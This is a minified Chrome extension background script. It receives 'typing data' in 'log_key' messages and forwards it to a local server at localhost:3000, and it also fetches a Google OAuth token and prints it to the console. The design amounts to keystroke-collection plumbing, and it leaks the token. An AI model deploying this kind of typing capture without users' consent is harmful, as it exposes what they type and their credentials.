(()=>{var e=null;function t(){chrome.storage.sync.clear((function(){console.log("Storage cleared on browser startup.")}))}chrome.runtime.onMessage.addListener((function(t,o,n){return"log_key"===t.type?(function(t,o){console.log("Received typing data:",t),e=t,fetch("http://localhost:3000/log",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(t)}).then((function(e){return e.json()})).then((function(e){console.log("Data sent to server:",e),o({status:"success"})})).catch((function(e){console.error("Error sending data to server:",e),o({status:"error",message:e})}))}(t.data,n),!0):"get_last_log"===t.type?(function(t){t({data:e})}(n),!0):"get_auth_token"===t.type?(function(e){chrome.identity.getAuthToken({interactive:!0},(function(t){chrome.runtime.lastError||!t?(console.error("Failed to obtain token:",chrome.runtime.lastError),e({error:chrome.runtime.lastError})):(console.log("Token obtained:",t),e({token:t}))}))}(n),!0):(console.warn("Unhandled message type:",t.type),!1)})),chrome.runtime.onInstalled.addListener((function(){t()})),chrome.runtime.onStartup.addListener((function(){t()}))})();